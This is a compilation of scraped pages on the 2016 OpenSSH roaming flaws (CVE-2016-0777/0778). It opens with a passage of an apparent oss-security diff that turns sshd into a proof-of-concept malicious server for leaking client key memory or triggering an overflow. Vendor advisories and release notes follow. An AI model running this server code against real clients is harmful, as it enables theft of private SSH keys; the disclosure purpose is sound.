 			packet_put_int(c->local_window);
 			packet_put_int(c->local_maxpacket);
 			packet_send();
+			*/
+			if (strcmp(ctype, "session") == 0) {
+				if (client_session_channel != -1)
+					fatal("%s: client_session_channel %d",
+					    __func__, client_session_channel);
+				client_session_channel = c->remote_id;
+				server_session_channel = c->self;
+			}
 		}
 	} else {
 		debug("server_input_channel_open: failure %s", ctype);
@@ -1111,6 +1124,196 @@ server_input_channel_open(int type, u_in
 }

 static void
+roaming_disconnect(Kex *const kex)
+{
+	const char *cp, *roaming = getenv("ROAMING");
+	if (roaming == NULL)
+		roaming = "infoleak";
+	int overflow = 0;
+	if ((cp = strstr(roaming, "overflow:")) != NULL)
+		overflow = cp[9];
+
+	const u_int client_recv_buf_size = packet_get_int();
+	packet_check_eom();
+	const u_int server_recv_buf_size = get_recv_buf_size();
+	const u_int server_send_buf_size = get_snd_buf_size();
+	debug("%s: client_recv_buf_size %u", __func__, client_recv_buf_size);
+	debug("%s: server_recv_buf_size %u", __func__, server_recv_buf_size);
+	debug("%s: server_send_buf_size %u", __func__, server_send_buf_size);
+
+	u_int client_send_buf_size = 0;
+	if ((cp = strstr(roaming, "client_send_buf_size:")) != NULL)
+		client_send_buf_size = strtoul(cp + 21, NULL, 0);
+	else if (client_recv_buf_size == DEFAULT_ROAMBUF)
+		client_send_buf_size = DEFAULT_ROAMBUF;
+	else {
+		const u_int
+		    max = MAX(client_recv_buf_size, server_recv_buf_size),
+		    min = MIN(client_recv_buf_size, server_recv_buf_size);
+		if (min <= 0)
+			fatal("%s: min %u", __func__, min);
+		if (((u_int64_t)(max - min) * 1024) / min < 1)
+			client_send_buf_size = server_send_buf_size;
+		else
+			client_send_buf_size = client_recv_buf_size;
+	}
+	debug("%s: client_send_buf_size %u", __func__, client_send_buf_size);
+	if (client_send_buf_size <= 0)
+		fatal("%s: client_send_buf_size", __func__);
+
+	u_int id = 0;
+	char *dir = NULL;
+	for (;;) {
+		id = arc4random();
+		debug("%s: id %u", __func__, id);
+		free(dir);
+		dir = get_roaming_dir(id);
+		if (mkdir(dir, S_IRWXU) == 0)
+			break;
+		if (errno != EEXIST)
+			fatal("%s: mkdir %s errno %d", __func__, dir, errno);
+	}
+	debug("%s: dir %s", __func__, dir);
+	if (chdir(dir) != 0)
+		fatal("%s: chdir %s errno %d", __func__, dir, errno);
+
+	u_int client_out_buf_size = 0;
+	if ((cp = strstr(roaming, "client_out_buf_size:")) != NULL)
+		client_out_buf_size = strtoul(cp + 20, NULL, 0);
+	else if (overflow != 0)
+		client_out_buf_size = MAX_ROAMBUF;
+	else
+		client_out_buf_size = 1 + arc4random() % 4096;
+	debug("%s: client_out_buf_size %u", __func__, client_out_buf_size);
+	if (client_out_buf_size <= 0)
+		fatal("%s: client_out_buf_size", __func__);
+	dump_roaming_file("client_out_buf_size", &client_out_buf_size,
+					   sizeof(client_out_buf_size));
+
+	if ((cp = strstr(roaming, "scp_mode")) != NULL) {
+		if (overflow != 0)
+			fatal("%s: scp_mode is incompatible with overflow %d",
+			    __func__, overflow);
+
+		u_int seconds_left_to_sleep = 3;
+		if ((cp = strstr(cp, "sleep:")) != NULL)
+			seconds_left_to_sleep = strtoul(cp + 6, NULL, 0);
+		debug("%s: sleep %u", __func__, seconds_left_to_sleep);
+
+		if (client_session_channel == -1)
+			fatal("%s: client_session_channel %d",
+			    __func__, client_session_channel);
+
+		packet_start(SSH2_MSG_CHANNEL_OPEN_CONFIRMATION);
+		packet_put_int(client_session_channel);
+		packet_put_int(server_session_channel);
+		packet_put_int(0); /* server window */
+		packet_put_int(0); /* server maxpacket */
+		packet_send();
+
+		packet_start(SSH2_MSG_CHANNEL_DATA);
+		packet_put_int(client_session_channel);
+		packet_put_string("\0\n", 2); /* response&source|sink&run_err */
+		packet_send();
+
+		packet_read_expect(SSH2_MSG_CHANNEL_REQUEST);
+		packet_get_int(); /* server channel */
+		debug("%s: channel request %s", __func__,
+		    packet_get_cstring(NULL));
+
+		while (seconds_left_to_sleep)
+			seconds_left_to_sleep = sleep(seconds_left_to_sleep);
+	}
+
+	packet_start(SSH2_MSG_REQUEST_SUCCESS);
+	packet_put_int(id); /* roaming_id */
+	packet_put_int64(arc4random()); /* cookie */
+	packet_put_int64(0); /* key1 */
+	packet_put_int64(0); /* key2 */
+	packet_put_int(client_out_buf_size - client_send_buf_size);
+	packet_send();
+	packet_write_wait();
+
+	if (overflow != 0) {
+		const u_int64_t full_client_out_buf = get_recv_bytes() +
+				     client_out_buf_size;
+
+		u_int fd_leaks = 4 * 8 * 8; /* MIN_CHUNK_SIZE in bits */
+		if ((cp = strstr(roaming, "fd_leaks:")) != NULL)
+			fd_leaks = strtoul(cp + 9, NULL, 0);
+		debug("%s: fd_leaks %u", __func__, fd_leaks);
+
+		while (fd_leaks--) {
+			packet_start(SSH2_MSG_CHANNEL_OPEN);
+			packet_put_cstring(overflow == 'X' ? "x11" :
+			    "auth-agent@...nssh.com"); /* ctype */
+			packet_put_int(arc4random()); /* server channel */
+			packet_put_int(arc4random()); /* server window */
+			packet_put_int(arc4random()); /* server maxpacket */
+			if (overflow == 'X') {
+				packet_put_cstring(""); /* originator */
+				packet_put_int(arc4random()); /* port */
+			}
+			packet_send();
+
+			packet_read_expect(SSH2_MSG_CHANNEL_OPEN_CONFIRMATION);
+			packet_get_int(); /* server channel */
+			packet_get_int(); /* client channel */
+			packet_get_int(); /* client window */
+			packet_get_int(); /* client maxpacket */
+			packet_check_eom();
+		}
+
+		while (get_recv_bytes() <= full_client_out_buf) {
+			packet_start(SSH2_MSG_GLOBAL_REQUEST);
+			packet_put_cstring(""); /* rtype */
+			packet_put_char(1); /* want_reply */
+			packet_send();
+
+			packet_read_expect(SSH2_MSG_REQUEST_FAILURE);
+			packet_check_eom();
+		}
+
+		if (kex == NULL)
+			fatal("%s: no kex, cannot rekey", __func__);
+		if (kex->flags & KEX_INIT_SENT)
+			fatal("%s: KEX_INIT_SENT already", __func__);
+		char *const ptr = buffer_ptr(&kex->my);
+		const u_int len = buffer_len(&kex->my);
+		if (len <= 1+4) /* first_kex_follows + reserved */
+			fatal("%s: kex len %u", __func__, len);
+		ptr[len - (1+4)] = 1; /* first_kex_follows */
+		kex_send_kexinit(kex);
+
+		u_int i;
+		packet_read_expect(SSH2_MSG_KEXINIT);
+		for (i = 0; i < KEX_COOKIE_LEN; i++)
+			packet_get_char();
+		for (i = 0; i < PROPOSAL_MAX; i++)
+			free(packet_get_string(NULL));
+		packet_get_char(); /* first_kex_follows */
+		packet_get_int(); /* reserved */
+		packet_check_eom();
+
+		char buf[8192*2]; /* two packet_read_seqnr bufferfuls */
+		memset(buf, '\0', sizeof(buf));
+		packet_start(SSH2_MSG_KEX_ROAMING_AUTH_FAIL);
+		packet_put_string(buf, sizeof(buf));
+		packet_send();
+		const Buffer *const output = packet_get_output();
+		dump_roaming_file("output", buffer_ptr(output),
+					    buffer_len(output));
+	}
+
+	const u_int64_t client_write_bytes = get_recv_bytes();
+	debug("%s: client_write_bytes %llu", __func__,
+	    (unsigned long long)client_write_bytes);
+	dump_roaming_file("client_write_bytes", &client_write_bytes,
+					  sizeof(client_write_bytes));
+	fatal("%s: all done for %s", __func__, dir);
+}
+
+static void
 server_input_global_request(int type, u_int32_t seq, void *ctxt)
 {
 	char *rtype;
@@ -1168,6 +1371,13 @@ server_input_global_request(int type, u_
 	} else if (strcmp(rtype, "no-more-sessions@...nssh.com") == 0) {
 		no_more_sessions = 1;
 		success = 1;
+	} else if (strcmp(rtype, ROAMING_REQUEST) == 0) {
+		if (want_reply != 1)
+			fatal("%s: rtype %s want_reply %d", __func__,
+				   rtype, want_reply);
+		roaming_disconnect(ctxt);
+		/* NOTREACHED */
+		fatal("%s: returned from %s", __func__, ROAMING_REQUEST);
 	}
 	if (want_reply) {
 		packet_start(success ?
diff -pruN openssh-6.4p1/sshd.c openssh-6.4p1+roaming/sshd.c
--- openssh-6.4p1/sshd.c	2013-07-19 20:21:53.000000000 -0700
+++ openssh-6.4p1+roaming/sshd.c	2016-01-07 01:04:15.000000000 -0800
@@ -2432,6 +2432,8 @@ do_ssh2_kex(void)
 	}
 	if (options.kex_algorithms != NULL)
 		myproposal[PROPOSAL_KEX_ALGS] = options.kex_algorithms;
+	else
+		myproposal[PROPOSAL_KEX_ALGS] = KEX_DEFAULT_KEX "," KEX_RESUME;

 	if (options.rekey_limit || options.rekey_interval)
 		packet_set_rekey_limits((u_int32_t)options.rekey_limit,

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from blogs.sophos.com_18e0a565_20250125_234739.html ===


[Skip to content](#content)

Search

* [Products & Services](https://news.sophos.com/en-us/category/products-services/)
* [Security Operations](https://news.sophos.com/en-us/category/security-operations/)
* [Threat Research](https://news.sophos.com/en-us/category/threat-research/)
* [AI Research](https://news.sophos.com/en-us/category/ai-research/)
* [Naked Security](https://news.sophos.com/en-us/category/serious-security/)
* [Sophos Life](https://news.sophos.com/en-us/category/sophos-life/)

Search

Open main menu

Search

* [Products & Services](https://news.sophos.com/en-us/category/products-services/)
* [Security Operations](https://news.sophos.com/en-us/category/security-operations/)
* [Threat Research](https://news.sophos.com/en-us/category/threat-research/)
* [AI Research](https://news.sophos.com/en-us/category/ai-research/)
* [Naked Security](https://news.sophos.com/en-us/category/serious-security/)
* [Sophos Life](https://news.sophos.com/en-us/category/sophos-life/)

# UTM Up2Date 9.319 released

Written by
[Alan Toews](https://news.sophos.com/en-us/author/alanctoews/ "Posts by Alan Toews")

[February 29, 2016](https://news.sophos.com/en-us/2016/02/29/utm-up2date-9-319-released/)
[Network](https://news.sophos.com/en-us/category/products-services/network/) [up2date](https://news.sophos.com/en-us/tag/up2date/) [UTM](https://news.sophos.com/en-us/tag/unified-threat-management/) [UTM 9](https://news.sophos.com/en-us/tag/utm-9/) [UTM 9.3](https://news.sophos.com/en-us/tag/utm-9-3/)

![UTM Up2Date](https://news.sophos.com/wp-content/uploads/2014/05/nsg.png)We’ve just released a new Up2Date package for all UTM 9.318 users, which provides the following security updates.

Read on for details about this release.

**News**

* Security Update

**Remarks**

* System will be rebooted

**9.318 Bugfixes**

* 36274 XSS vulnerability in mod\_url\_hardening [9.3]
* 36275 XSS vulnerability in mod\_avscan [9.3]
* 36292 OpenSSH security update (CVE-2016-0777, CVE-2016-0778) [9.3]
* 36309 Bind Vulnerability CVE-2015-8000 [9.3]
* 36350 ISC DHCP security update (CVE-2015-8605) [9.3]
* 36361 Flow Monitor broken since the XSS patches [9.3]
* 36379 glibc security update (CVE-2015-7547) [9.3]

| ftp link: | ftp://ftp.astaro.de/UTM/v9/up2date/u2d-sys-9.318005-319005.tgz.gpg |
| --- | --- |
| Up2date MD5sum: | ``` 7656aa4b4ac128597d58e90b7a9653d8 ``` |
| File size: | ~42 MB |

**Up2Date Installation**

Sophos Up2Date technology makes it easy to upgrade your Sophos UTM to the latest version.

There are two ways to apply an already-downloaded Up2Date package to the system:

1. Log on to WebAdmin, navigate to Management > Up2Date > Overview and use “Update to latest version now” to install the Firmware Up2Date. Click on the “Watch Up2Date Progress in new window” and an extra browser window will show the progress of the Up2Date installation. (The System administrator will receive a notification email once the Up2Date process has finished.)
2. Download the Up2Date package from our HTTP or FTP Server and install it under Management > Up2Date > Advanced.

If you want to provide feedback or want to discuss any of the UTM V9 features you should post it on our [User Bulletin Board](https://community.sophos.com/products/unified-threat-management/ "User Bulletin Board"). Please indicate the version you are using to help us (and everyone helping you).

**Feedback**

* If you have any feedback on our help, manual, or any documentation (Online Help) please send it to nsg-documentations@sophos.com.
* You are free to use our new demo server environment without hassle, nags, or registration. Enjoy!
* If you have any questions or comments regarding this release, please see our [online forums](https://community.sophos.com/products/unified-threat-management/f/52 "Sophos Community forum: UTM") for more information.

Alan Toews

Technical Product Manager

* [Share on Facebook](http://www.facebook.com/share.php?u=https://news.sophos.com/?p=30982&title=UTM%20Up2Date%209.319%20released "Share on Facebook")
* [Share on X](http://twitter.com/intent/tweet?text=UTM%20Up2Date%209.319%20released%20https%3A%2F%2Fnews.sophos.com%2F%3Fp%3D30982 "Share on X")
* [Share on LinkedIn](http://www.linkedin.com/shareArticle?mini=true&url=https://news.sophos.com/en-us/2016/02/29/utm-up2date-9-319-released/ "Share on LinkedIn")

![](https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png)
About the Author
### [Alan Toews](https://news.sophos.com/en-us/author/alanctoews/ "Posts by Alan Toews")

### Read Similar Articles

May 24, 2021
## [What to expect when you’ve been hit with Avaddon ransomware](https://news.sophos.com/en-us/2021/05/24/what-to-expect-when-youve-been-hit-with-avaddon-ransomware/)

May 19, 2021
## [What’s New in Sophos EDR 4.0](https://news.sophos.com/en-us/2021/05/19/whats-new-in-sophos-edr-4-0/)

May 19, 2021
## [Sophos XDR: Driven by data](https://news.sophos.com/en-us/2021/05/19/sophos-xdr-driven-by-data/)

Subscribe to get the latest updates in your inbox.

Which categories are you interested in?

* Products and Services
* Threat Research
* Security Operations
* AI Research
* #SophosLife

Change Region

* [América Latina](https://news.sophos.com/es-419)
* [Brasil](https://news.sophos.com/pt-br)
* [Deutschland](https://news.sophos.com/de-de)
* [English](https://news.sophos.com/en-us)
* [France](https://news.sophos.com/fr-fr)
* [Iberia](https://news.sophos.com/es-es)
* [Italia](https://news.sophos.com/it-it)
* [Japan](https://news.sophos.com/ja-jp)

[Terms](https://www.sophos.com/en-us/legal/sophos-website.aspx)

Privacy

* [Privacy Notice](https://www.sophos.com/en-us/legal/sophos-group-privacy-policy.aspx)
* [Cookies](https://www.sophos.com/en-us/legal/cookie-information.aspx)

Legal

* [General](https://www.sophos.com/en-us/legal.aspx)
* [Modern Slavery Statement](https://www.sophos.com/en-us/legal/modern-slavery-act-transparency-statement.aspx)
* [Speak Out](https://secure.ethicspoint.eu/domain/media/en/gui/104916/index.html)

© 1997 - 2025 Sophos Ltd. All rights reserved

[Go to mobile version](https://news.sophos.com/en-us/2016/02/29/utm-up2date-9-319-released/?amp=1)



=== Content from lists.opensuse.org_44f2dd5a_20250125_234719.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/QFUZJ6LFD7MK5BJVULW4JRX3R3VMPIO7/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/QFUZJ6LFD7MK5BJVULW4JRX3R3VMPIO7/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/QFUZJ6LFD7MK5BJVULW4JRX3R3VMPIO7/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/QFUZJ6LFD7MK5BJVULW4JRX3R3VMPIO7/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/QFUZJ6LFD7MK5BJVULW4JRX3R3VMPIO7/#QFUZJ6LFD7MK5BJVULW4JRX3R3VMPIO7)

# [security-announce] SUSE-SU-2016:0119-1: critical: Security update for openssh

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

14 Jan
2016

14 Jan
'16

19:12

SUSE Security Update: Security update for openssh
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: SUSE-SU-2016:0119-1
Rating: critical
References: #961642 #961645
Cross-References: CVE-2016-0777 CVE-2016-0778
Affected Products:
SUSE Linux Enterprise Server for VMWare 11-SP3
SUSE Linux Enterprise Server 11-SP3
SUSE Linux Enterprise Desktop 11-SP3
SUSE Linux Enterprise Debuginfo 11-SP3
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that fixes two vulnerabilities is now available.
Description:
This update for openssh fixes the following issues:
- CVE-2016-0777: A malicious or compromised server could cause the OpenSSH
client to expose part or all of the client's private key through the
roaming feature (bsc#961642)
- CVE-2016-0778: A malicious or compromised server could could trigger a
buffer overflow in the OpenSSH client through the roaming feature
(bsc#961645)
This update disables the undocumented feature supported by the OpenSSH
client and a commercial SSH server.
Patch Instructions:
To install this SUSE Security Update use YaST online\_update.
Alternatively you can run the command listed for your product:
- SUSE Linux Enterprise Server for VMWare 11-SP3:
zypper in -t patch slessp3-openssh-2016011301-12325=1
- SUSE Linux Enterprise Server 11-SP3:
zypper in -t patch slessp3-openssh-2016011301-12325=1
- SUSE Linux Enterprise Desktop 11-SP3:
zypper in -t patch sledsp3-openssh-2016011301-12325=1
- SUSE Linux Enterprise Debuginfo 11-SP3:
zypper in -t patch dbgsp3-openssh-2016011301-12325=1
To bring your system up-to-date, use "zypper patch".
Package List:
- SUSE Linux Enterprise Server for VMWare 11-SP3 (i586 x86\_64):
openssh-6.2p2-0.24.1
openssh-askpass-6.2p2-0.24.1
openssh-askpass-gnome-6.2p2-0.24.3
- SUSE Linux Enterprise Server 11-SP3 (i586 ia64 ppc64 s390x x86\_64):
openssh-6.2p2-0.24.1
openssh-askpass-6.2p2-0.24.1
openssh-askpass-gnome-6.2p2-0.24.3
- SUSE Linux Enterprise Desktop 11-SP3 (i586 x86\_64):
openssh-6.2p2-0.24.1
openssh-askpass-6.2p2-0.24.1
openssh-askpass-gnome-6.2p2-0.24.3
- SUSE Linux Enterprise Debuginfo 11-SP3 (i586 ia64 ppc64 s390x x86\_64):
openssh-askpass-gnome-debuginfo-6.2p2-0.24.3
openssh-debuginfo-6.2p2-0.24.1
openssh-debugsource-6.2p2-0.24.1
References:
<https://www.suse.com/security/cve/CVE-2016-0777.html>
<https://www.suse.com/security/cve/CVE-2016-0778.html>
<https://bugzilla.suse.com/961642>
<https://bugzilla.suse.com/961645>
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/QFUZJ6LFD7MK5BJVULW4JRX3R3VMPIO7/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/QFUZJ6LFD7MK5BJVULW4JRX3R3VMPIO7/#QFUZJ6LFD7MK5BJVULW4JRX3R3VMPIO7)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from h20566.www2.hpe.com_5cfeb606_20250125_234743.html ===


[**Support Center**](/connect/s/)



=== Content from lists.opensuse.org_2b07cd91_20250125_234719.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/YVYBOXYGA72P6CD5L7MBLDDUPSRKH4FR/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/YVYBOXYGA72P6CD5L7MBLDDUPSRKH4FR/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/YVYBOXYGA72P6CD5L7MBLDDUPSRKH4FR/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/YVYBOXYGA72P6CD5L7MBLDDUPSRKH4FR/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/YVYBOXYGA72P6CD5L7MBLDDUPSRKH4FR/#YVYBOXYGA72P6CD5L7MBLDDUPSRKH4FR)

# [security-announce] SUSE-SU-2016:0118-1: critical: Security update for openssh

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

14 Jan
2016

14 Jan
'16

19:12

SUSE Security Update: Security update for openssh
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: SUSE-SU-2016:0118-1
Rating: critical
References: #961642 #961645
Cross-References: CVE-2016-0777 CVE-2016-0778
Affected Products:
SUSE Linux Enterprise Server 12-SP1
SUSE Linux Enterprise Server 12
SUSE Linux Enterprise Desktop 12-SP1
SUSE Linux Enterprise Desktop 12
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that fixes two vulnerabilities is now available.
Description:
This update for openssh fixes the following issues:
- CVE-2016-0777: A malicious or compromised server could cause the OpenSSH
client to expose part or all of the client's private key through the
roaming feature (bsc#961642)
- CVE-2016-0778: A malicious or compromised server could could trigger a
buffer overflow in the OpenSSH client through the roaming feature
(bsc#961645)
This update disables the undocumented feature supported by the OpenSSH
client and a commercial SSH server.
Patch Instructions:
To install this SUSE Security Update use YaST online\_update.
Alternatively you can run the command listed for your product:
- SUSE Linux Enterprise Server 12-SP1:
zypper in -t patch SUSE-SLE-SERVER-12-SP1-2016-85=1
- SUSE Linux Enterprise Server 12:
zypper in -t patch SUSE-SLE-SERVER-12-2016-85=1
- SUSE Linux Enterprise Desktop 12-SP1:
zypper in -t patch SUSE-SLE-DESKTOP-12-SP1-2016-85=1
- SUSE Linux Enterprise Desktop 12:
zypper in -t patch SUSE-SLE-DESKTOP-12-2016-85=1
To bring your system up-to-date, use "zypper patch".
Package List:
- SUSE Linux Enterprise Server 12-SP1 (ppc64le s390x x86\_64):
openssh-6.6p1-33.1
openssh-askpass-gnome-6.6p1-33.1
openssh-askpass-gnome-debuginfo-6.6p1-33.1
openssh-debuginfo-6.6p1-33.1
openssh-debugsource-6.6p1-33.1
openssh-fips-6.6p1-33.1
openssh-helpers-6.6p1-33.1
openssh-helpers-debuginfo-6.6p1-33.1
- SUSE Linux Enterprise Server 12 (ppc64le s390x x86\_64):
openssh-6.6p1-33.1
openssh-askpass-gnome-6.6p1-33.1
openssh-askpass-gnome-debuginfo-6.6p1-33.1
openssh-debuginfo-6.6p1-33.1
openssh-debugsource-6.6p1-33.1
openssh-fips-6.6p1-33.1
openssh-helpers-6.6p1-33.1
openssh-helpers-debuginfo-6.6p1-33.1
- SUSE Linux Enterprise Desktop 12-SP1 (x86\_64):
openssh-6.6p1-33.1
openssh-askpass-gnome-6.6p1-33.1
openssh-askpass-gnome-debuginfo-6.6p1-33.1
openssh-debuginfo-6.6p1-33.1
openssh-debugsource-6.6p1-33.1
openssh-helpers-6.6p1-33.1
openssh-helpers-debuginfo-6.6p1-33.1
- SUSE Linux Enterprise Desktop 12 (x86\_64):
openssh-6.6p1-33.1
openssh-askpass-gnome-6.6p1-33.1
openssh-askpass-gnome-debuginfo-6.6p1-33.1
openssh-debuginfo-6.6p1-33.1
openssh-debugsource-6.6p1-33.1
openssh-helpers-6.6p1-33.1
openssh-helpers-debuginfo-6.6p1-33.1
References:
<https://www.suse.com/security/cve/CVE-2016-0777.html>
<https://www.suse.com/security/cve/CVE-2016-0778.html>
<https://bugzilla.suse.com/961642>
<https://bugzilla.suse.com/961645>
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/YVYBOXYGA72P6CD5L7MBLDDUPSRKH4FR/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/YVYBOXYGA72P6CD5L7MBLDDUPSRKH4FR/#YVYBOXYGA72P6CD5L7MBLDDUPSRKH4FR)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from nmap.org_9ba698e9_20250126_125220.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[Download](/download.html)
[Reference Guide](/book/man.html)
[Book](/book/)
[Docs](/docs.html)
[Zenmap GUI](/zenmap/)
[In the Movies](/movies/)

[Get Nmap 7.95 here](/download)
## News

* Nmap.org has been redesigned! Our new mobile-friendly layout is also on [Npcap.com](https://npcap.com),
  [Seclists.org](https://seclists.org),
  [Insecure.org](https://insecure.org), and
  [Sectools.org](https://sectools.org).* Nmap 7.90 has been released with Npcap 1.00 along with dozens of other performance improvements, bug fixes, and feature enhancements! [[Release Announcement](https://seclists.org/nmap-announce/2020/1) | [Download page](https://nmap.org/download.html)]* After more than 7 years of development and 170 public pre-releases, we're delighted to announce Npcap version 1.00! [[Release Announcement](https://seclists.org/nmap-announce/2020/0) | [Download page](https://nmap.org/npcap/)]* Nmap 7.80 was released for DEFCON 27! [[release notes](https://seclists.org/nmap-announce/2019/0) | [download](https://nmap.org/download.html)]* Nmap turned 20 years old on September 1, 2017! Celebrate by reading [the original Phrack #51 article](/p51-11.html). [#Nmap20](https://twitter.com/hashtag/Nmap20)!* Nmap 7.50 is now available! [[release notes](https://seclists.org/nmap-announce/2017/3) | [download](https://nmap.org/download.html)]* Nmap 7 is now available! [[release notes](/7/) | [download](https://nmap.org/download.html)]* We're pleased to release our new and Improved [Icons of the Web](/favicon/) project—a 5-gigapixel interactive collage of the top million sites on the Internet!* Nmap has been discovered in two new movies! It's used to [hack Matt Damon's brain in Elysium](movies/#elysium) and also to [launch nuclear missiles in G.I. Joe: Retaliation](movies/#gijoe)!* We're delighted to announce Nmap 6.40 with 14 new [NSE scripts](/book/nse.html), hundreds of new [OS](/book/osdetect.html) and [version detection](/book/vscan.html) signatures, and many great new features! [[Announcement/Details](https://seclists.org/nmap-announce/2013/1)], [[Download Site](https://nmap.org/download.html)]* We just released Nmap 6.25 with 85 new NSE scripts, performance improvements, better OS/version detection, and more! [[Announcement/Details](https://seclists.org/nmap-hackers/2012/4)], [[Download Site](https://nmap.org/download.html)]* Any release as big as Nmap 6 is bound to uncover a few bugs. We've now fixed them with [Nmap 6.01](https://seclists.org/nmap-hackers/2012/3)!* Nmap 6 is now available! [[release notes](/6/) | [download](https://nmap.org/download.html)]* The security community has spoken! 3,000 of you shared favorite security tools for our relaunched [SecTools.Org](https://sectools.org). It is sort of like Yelp for security tools. Are you familiar with all of the [49 new tools](https://sectools.org/tag/new/) in this edition?* [Nmap 5.50 Released](https://seclists.org/nmap-hackers/2011/0): Now with Gopher protocol support! Our first stable release in a year includes 177 NSE scripts, 2,982 OS fingerprints, and 7,319 version detection signatures. Release focuses were the Nmap Scripting Engine, performance, Zenmap GUI, and the Nping packet analysis tool. [[Download page](https://nmap.org/download) | [Release notes](https://seclists.org/nmap-hackers/2011/0)]* Those who missed Defcon can now watch Fyodor and David Fifield demonstrate the power of the Nmap Scripting Engine. They give an overview of NSE, use it to explore Microsoft's global network, write an NSE script from scratch, and hack a webcam--all in 38 minutes! ([Presentation video](/presentations/BHDC10/))* *Icons of the Web*: explore favicons for the top million web sites with our [new poster and online viewer](/favicon).* We're delighted to announce the immediate, free availability of the [Nmap Security Scanner version 5.00](/5/). Don't miss the [top 5 improvements in Nmap 5](/5/#5changes).* After years of effort, we are delighted to release [Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning](/book/)!* We now have an active Nmap [Facebook page](http://facebook.com/nmap) and [Twitter feed](http://twitter.com/nmap/) to augment the [mailing lists](#lists). All of these options offer RSS feeds as well.

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
